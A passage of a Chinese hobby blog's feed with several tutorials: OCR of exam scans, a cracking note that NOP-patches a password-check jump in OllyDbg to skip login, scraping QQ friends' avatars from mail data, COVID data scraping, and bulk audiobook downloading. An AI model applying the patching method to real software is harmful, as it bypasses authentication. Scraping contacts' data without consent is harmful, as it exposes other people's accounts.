    with open(str(j) + &quot;.jpg&quot;, &quot;wb&quot;)as fe:
        fe.write(res)
    j = j + 1
    print(&quot;下载&quot; + i)
</code></pre>
<p>这样所有的图片都被下载下来了</p>
<figure data-type="image" tabindex="2"><img src="http://image.scorner.cn/qiniulmg/20200621111718.png" alt="image-20200621111716669" loading="lazy"></figure>
<h4 id="三-文字识别">三、文字识别</h4>
<p>文字识别调用的百度的ocr服务</p>
<h5 id="a申请百度api接口的教程">a.申请百度api接口的教程</h5>
<pre><code class="language-html">https://blog.csdn.net/biao197/article/details/102907492
</code></pre>
<h5 id="b调用接口的过程">b.调用接口的过程</h5>
<pre><code class="language-python"># 获取token
access_token = ''
host = 'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=[改成api key]&amp;client_secret=[改成secret key]' 
response = requests.get(host)
if response:
    access_token = response.json()['access_token']

request_url = &quot;https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic&quot;
# # 二进制方式打开图片文件
for i in range(1, 100): # 有多少张图片写多少张图片
    f = open(str(i) + '.jpg', 'rb')  # 刚才下载图片的路径
    img = base64.b64encode(f.read())
    params = {&quot;image&quot;: img}
    # access_token = '[调用鉴权接口获取的token]'
    request_url = request_url + &quot;?access_token=&quot; + access_token
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    response = requests.post(request_url, data=params, headers=headers)
    if response:
        print(response.json())
</code></pre>
<p>识别的效果如下</p>
<figure data-type="image" tabindex="3"><img src="http://image.scorner.cn/qiniulmg/20200621112316.png" alt="image-20200621112314382" loading="lazy"></figure>
<h5 id="c对识别数据进行清洗">c.对识别数据进行清洗</h5>
<pre><code class="language-python">regex1 = &quot;log_id.*]&quot;

list1 = re.findall(regex1, raw_data) # raw_data 为识别出的数据
list2 = []
for i in list1:
    regex2 = &quot;{'words': .*'}?&quot;
    j = re.findall(regex2, i)
    for k in j:
        k = re.sub(&quot;{'words': '&quot;, &quot;\n&quot;, k)
        k = re.sub(&quot;'},&quot;, &quot;&quot;, k)
        k = re.sub(&quot;'}&quot;, &quot;&quot;, k)
        list2.append(k)
        
for m, n in zip(list2, answer): # answer为答案列表
    print(m)
    print(n)
</code></pre>
<p>最终结果，但是发现试题的选项选择的不太很好</p>
<figure data-type="image" tabindex="4"><img src="http://image.scorner.cn/qiniulmg/20200621112656.png" alt="image-20200621112651618" loading="lazy"></figure>
<p>扔到word中，稍微进行修正 如去掉多选题两分，第一章绪论这些 ， 再把 是「cll换成c，再进行局部微调</p>
<figure data-type="image" tabindex="5"><img src="http://image.scorner.cn/qiniulmg/20200621113236.png" alt="image-20200621113234456" loading="lazy"></figure>
<h4 id="四-结果展示">四、结果展示</h4>
<figure data-type="image" tabindex="6"><img src="http://image.scorner.cn/qiniulmg/20200621113447.png" alt="image-20200621113445453" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[逆向学习笔记——nop填充]]></title>
        <id>https://blownscarerow.github.io/post/ruan-jian-po-jie-xue-xi-bi-ji-nop-tian-chong/</id>
        <link href="https://blownscarerow.github.io/post/ruan-jian-po-jie-xue-xi-bi-ji-nop-tian-chong/">
        </link>
        <updated>2020-06-20T23:57:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="一-软件特征">一、软件特征</h3>
<p>登录可以输入三次密码，三次密码输入错误后，软件自动关闭</p>
<img src="http://image.scorner.cn/qiniulmg/20200621064747.gif" alt="测试3" style="zoom: 50%;" />
<h3 id="二-破解过程">二、破解过程</h3>
<h4 id="1查壳">1.查壳</h4>
<p>把软件放到PEID中查壳，发现软件是用Delphi写的，无壳</p>
<img src="http://image.scorner.cn/qiniulmg/20200621070340.png" alt="image-20200621070329709" style="zoom: 80%;"/>
<h4 id="2载入od">2.载入OD</h4>
<h5 id="a定位程序点">a.定位程序点</h5>
<p>根据软件特征，在OD中寻找“密码错误”，查看反汇编代码</p>
<img src="http://image.scorner.cn/qiniulmg/20200621071140.gif" alt="测试4" style="zoom:50%;" />
<h5 id="b设置断点分析跳转关系">b.设置断点，分析跳转关系</h5>
<p>这里发现，用户密码错误是由75 31地址 跳转而来，在这里下一个断点进行检验</p>
<img src="http://image.scorner.cn/qiniulmg/20200621072259.png" alt="image-20200621072256392" style="zoom: 67%;float:left" />
<p>设置断点后，启动程序，输入错误密码，程序卡住，在OD中发现跳转已经实现，单步执行程序，程序正常运行</p>
<p>则可以判断出密码错误是由75 31地址跳转而来</p>
<figure data-type="image" tabindex="1"><img src="http://image.scorner.cn/qiniulmg/20200621072741.gif" alt="测试5" loading="lazy"></figure>
<h5 id="cnop填充">c.nop填充</h5>
<p>nop为空填充，不执行跳转。在跳转位置75 31 用nop进行填充，这样就实现了免密码登录。</p>
<figure data-type="image" tabindex="2"><img src="http://image.scorner.cn/qiniulmg/20200621073700.gif" alt="测试6" loading="lazy"></figure>
<h4 id="3-保存">3、保存</h4>
<p>选中nop填充代码，复制到可执行文件—选择，再保存文件即可</p>
<figure data-type="image" tabindex="3"><img src="http://image.scorner.cn/qiniulmg/20200621075842.gif" alt="测试8" loading="lazy"></figure>
<h3 id="三-结果">三、结果</h3>
<p>这样就实现了免密码登录</p>
<figure data-type="image" tabindex="4"><img src="http://image.scorner.cn/qiniulmg/20200621075715.gif" alt="测试10" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ qq头像拼图制作]]></title>
        <id>https://blownscarerow.github.io/post/pa-qu-qq-hao-you-tou-xiang-zhi-zuo-tie-tu/</id>
        <link href="https://blownscarerow.github.io/post/pa-qu-qq-hao-you-tou-xiang-zhi-zuo-tie-tu/">
        </link>
        <updated>2020-06-20T13:45:40.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>Shape Collage Pro(照片拼贴制作器)是一款免费的图片拼贴制作工具。可以轻松制作任意形状的图片拼图，如矩形、心形、圆形、字母形状，甚至绘制自定义形状。制作中Shape Collage允许你调整拼贴大小、图片大小、图片数量、图片间距等一系列参数，其他包括背景、边框颜色等，从而制作出精美的拼贴效果。</p>
</blockquote>
<h3 id="一-头像爬取">一、头像爬取</h3>
<h4 id="1qq头像接口">1.qq头像接口</h4>
<pre><code class="language-html">https://q4.qlogo.cn/g?b=qq&amp;nk=QQ号码&amp;s=140
</code></pre>
<h4 id="2好友qq号码获取">2.好友qq号码获取</h4>
<p>登录qq邮箱，右击检查，选择Network</p>
<p>刷新网页，在搜索中搜索laddr_lastlist  后复制response的内容到记事本中</p>
<figure data-type="image" tabindex="1"><img src="http://image.scorner.cn/qiniulmg/20200620212556.gif" alt="测试3" loading="lazy"></figure>
<h4 id="3头像下载">3.头像下载</h4>
<h5 id="a代码实现">a.代码实现</h5>
<pre><code class="language-python">import re
import codecs
import time
import requests

txtpath = '1.txt'  # 你从QQ邮箱中粘贴的txt文件
savepath = '头像'  # 头像存储位置

friends_count = 0  # 初始化好友数量


def gettouxiang(txtpath):  # 输入你的txt文件存储位置
    file = codecs.open(txtpath, 'rb', 'utf-8')
    s = file.read()
    pattern = re.compile(r'\d+@qq.com')
    all_mail = pattern.findall(s)  # 正则表达式匹配所有的qq号
    all_link = []  # 用于存储需要访问的链接
    url = 'https://q4.qlogo.cn/g?b=qq&amp;nk='
    for mail in all_mail:
        qq = mail.replace('@qq.com', '')
        l = url + qq + '&amp;s=140'
        all_link.append(l)
    i = 0  # 初始化下载图片数量
    friends_count = len(all_link)  # 获取朋友头像数量
    print('共{}个头像'.format(friends_count))
    for link in all_link:  # 遍历链接，下载头像
        i += 1
        saveurl = savepath + str(i) + '.png'
        print('第 %d 个' % i, end=' ')
        savaImg(link, saveurl)
    return True


def savaImg(picurl, saveurl):  # 存储图片函数，picurl是图片的URL，saveurl是本地存储位置
    try:
        start = time.time()
        response = requests.get(picurl, stream=True)
        with open(saveurl, 'wb') as file:  # 下载图片到本地
            file.write(response.content)
            print('【下载完成】:', end=' ')
        end = time.time()
        time_ = end - start
        print('用时: %.2f秒' % (time_))
        return True
    except:
        print('worry')
        # savaImg(picurl, saveurl)


def main():
    gettouxiang(txtpath)  # 获取头像


if __name__ == '__main__':
    main()
</code></pre>
<h5 id="b结果展示">b.结果展示</h5>
<p>这样我们就把好友的头像都下载下来了</p>
<figure data-type="image" tabindex="2"><img src="http://image.scorner.cn/qiniulmg/20200620214734.png" alt="image-20200620212815452" loading="lazy"></figure>
<h3 id="二-贴图生成">二、贴图生成</h3>
<p>这里我们使用 shape collage进行图片拼图，导入图片还可以字定义图形，美观且简单</p>
<img src="http://image.scorner.cn/qiniulmg/20200620214002.png" alt="image-20200620213952116" style="zoom:80%;float:left" />
<p>效果展示</p>
<img src="http://image.scorner.cn/qiniulmg/20200620214427.jpg" alt="1" style="zoom: 50%;float:left" />
<h3 id="三-下载地址">三、下载地址</h3>
<p>shape collage pro 下载地址</p>
<pre><code class="language-html">https://thegai.lanzous.com/iTVwzdbagwh
</code></pre>
<h3 id="四-参考链接">四、参考链接</h3>
<pre><code class="language-html">https://blog.csdn.net/weixin_43347550/article/details/105704623?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159265526719195239836693%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=159265526719195239836693&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v2-3-105704623.first_rank_ecpm_v3_pc_rank_v2&amp;utm_term=qq%E5%A4%B4%E5%83%8F%E7%88%AC%E5%8F%96
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[数据可视化制作]]></title>
        <id>https://blownscarerow.github.io/post/shu-ju-ke-shi-hua-zhi-zuo/</id>
        <link href="https://blownscarerow.github.io/post/shu-ju-ke-shi-hua-zhi-zuo/">
        </link>
        <updated>2020-06-20T01:41:44.000Z</updated>
        <content type="html"><![CDATA[<p>前段时间看BBC新闻发现这样一个图片，便好奇怎么做出来。查阅相关资料后，便做了一个类似的出来。分为两步，一是数据的准备，二是可视化图表的制作。</p>
<img src="http://image.scorner.cn/qiniulmg/20200620075502.gif" alt="测试1" style="zoom: 100%;float:left" />
<h4 id="一-数据准备">一、数据准备</h4>
<h5 id="1每日疫情变化网站推荐">1.每日疫情变化网站推荐</h5>
<p>国内:</p>
<pre><code class="language-html">https://voice.baidu.com/act/newpneumonia/newpneumonia/?from=osari_aladin_banner#tab4 
</code></pre>
<p>国外：</p>
<pre><code class="language-html">https://www.worldometers.info/coronavirus/
https://www.arcgis.com/apps/opsdashboard/index.html#/bda7594740fd40299423467b48e9ecf6
</code></pre>
<h5 id="2数据爬取">2.数据爬取</h5>
<p>以worldometer为例,进入到每个国家详情中发现每日数据在图片中，通过搜索图片中的数据找到了数据的地址</p>
<img src="http://image.scorner.cn/qiniulmg/20200620083321.png" alt="QQ图片20200620083020" style="zoom: 50%;" float:left/>
<p>这样我们可以通过xpath定位再通过正则提取到数据，这样我们就拿到了一个国家的整体数据</p>
<pre><code class="language-python">et = etree.HTML(xml)
data=et.xpath('//div[@style=&quot;margintop:10px;marginbottom:40px;&quot;]/script[@type=&quot;text/javascript&quot;]/text()')[0]
 
# 提取日期
dates = re.search(&quot;categories: (.*?)},&quot;, data).group()
dates = dates.replace(&quot;categories: [&quot;,&quot;&quot;)
dates = dates.replace(&quot;]        },&quot;,&quot;&quot;)
 
# 提取数量
counts = re.search(r&quot;data:\s+(.*?)\s+}],&quot;, data).group()
counts = counts.replace(&quot;data: [&quot;,&quot;&quot;)
counts = counts.replace(&quot;]        }],&quot;, &quot;&quot;)

# 数据整理
for i in zip(dates,counts):
    print(i)
</code></pre>
<p>所有国家的数据</p>
<p>通过观察，每个国家的地址（<mark>部分国家例外</mark>）为</p>
<pre><code class="language-html">https://www.worldometers.info/coronavirus/country/(国家英文小写)
</code></pre>
<p>可以在首页提取到每个国家的名字再使用lower函数进行处理，再依次遍历写入excel即可</p>
<img src="http://image.scorner.cn/qiniulmg/20200620084607.png" alt="image-20200620084605687" style="zoom: 50%;float:left" />
<p>最终，我们拿到了数据</p>
<img src="http://image.scorner.cn/qiniulmg/20200620085212.png" alt="image-20200620085209455" style="zoom: 50%;" />
<h4 id="二-可视化制作">二、可视化制作</h4>
<p>推荐一个可视化网站，注册一个账号即可，免费使用</p>
<pre><code class="language-html">https://app.flourish.studio/login
</code></pre>
<img src="http://image.scorner.cn/qiniulmg/20200620085743.png" alt="image-20200620085635032" style="zoom:80%;float:left" />
<p>里面内置了很多可视化模板，并且免费</p>
<img src="http://image.scorner.cn/qiniulmg/20200620085739.png" alt="image-20200620085737928" style="zoom:50%;float:left" />
<p>在DATA将数据进行导入</p>
<img src="http://image.scorner.cn/qiniulmg/20200620090216.png" alt="image-20200620090214537" style="zoom:33%;flaot:left" />
<p>在caption中，可以设置事件触发，比如满足什么条件将会出现什么</p>
<img src="http://image.scorner.cn/qiniulmg/20200620092131.png" alt="image-20200620092127694" style="zoom:90%;float:left" />
<h4 id="三-结果展示">三、结果展示</h4>
<img src="http://image.scorner.cn/qiniulmg/20200620094005.gif" style="zoom: 67%;float:left" />
<p>希望疫情早早结束🙏</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[记一次有声小说爬取]]></title>
        <id>https://blownscarerow.github.io/post/ji-yi-ci-shuo-you-sheng-yin-pin-pa-qu/</id>
        <link href="https://blownscarerow.github.io/post/ji-yi-ci-shuo-you-sheng-yin-pin-pa-qu/">
        </link>
        <updated>2020-06-19T03:19:05.000Z</updated>
        <content type="html"><![CDATA[<p><mark>本文仅供学习使用</mark></p>
<p>突然心血来潮想听恐怖小说，在网上找了找发现大部分在线有声小说只能在游览器里面听而不能下载到本地，就很不方便，这里记录一下对一篇有声小说的全集下载。步骤分为两步，一找到链接，二批量下载。</p>
<p>小说地址：http://www.lanren6.com/book/43041.html</p>
<h3 id="一-小说音频地址找寻">一、小说音频地址找寻</h3>
<h4 id="1依次进入到播放位置">1.依次进入到播放位置</h4>
<img src="http://image.scorner.cn/qiniulmg/20200619101958.png" alt="image-20200619101934149" style="zoom:100%;float:left" />
<img src="http://image.scorner.cn/qiniulmg/20200619102429.png" alt="image-20200619102426676" style="zoom:100%;float:left" />
<h4 id="2idm获取下载地址">2.idm获取下载地址</h4>
<img src="http://image.scorner.cn/qiniulmg/20200619101551.png" alt="image-20200619101535118" style="zoom: 100%;float:left" />
<h4 id="3规律寻找">3.规律寻找</h4>
<p>小说一共125集，经过多次抓取地址发现：</p>
<p>前93集地址为</p>
<pre><code class="language-html">http://kiohhbf.meiwenfen.com/%E8%B5%B0%E9%98%B4%E4%BA%BA/(001-093).mp3
</code></pre>
<p>94-125地址为</p>
<pre><code class="language-html">http://tingmp33.meiwenfen.com/%E8%B5%B0%E9%98%B4%E4%BA%BA/(094-125).mp3
</code></pre>
<h3 id="二-代码实现">二、代码实现</h3>
<p>我们用python爬虫带实现批量下载，代码如下</p>
<pre><code class="language-python">import requests
import time

# 设置请求头，模拟游览器
headers = {
    'user-agent': &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1&quot;
}

# 进行循环遍历
for i in range(1, 125):
    # 有时候爬取太快会报错，可以让他适当停一停
    # time.sleep(0.2)
    url1 = 'http://kiohhbf.meiwenfen.com/%E8%B5%B0%E9%98%B4%E4%BA%BA/{:0&gt;3d}.mp3'.format(i)    # 前93章的地址
    url2 = 'http://tingmp33.meiwenfen.com/%E8%B5%B0%E9%98%B4%E4%BA%BA/{:0&gt;3d}.mp3'.format(i)   # 94-125章地址
    if i &lt;= 93:
        res = requests.get(url=url1, headers=headers)
    else:
        res = requests.get(url=url2, headers=headers)
    music = res.content
    with open('走阴人{}.mp3'.format(i), 'wb') as file:  # 保存到本地的文件名
        file.write(music)
        file.flush()
</code></pre>
<h3 id="三-结果">三、结果</h3>
<p>这样我们就把全集给下载下来了。😁</p>
<img src="http://image.scorner.cn/qiniulmg/20200619111735.png" alt="QQ图片20200619111652" style="zoom: 67%;" />
]]></content>
    </entry>
</feed>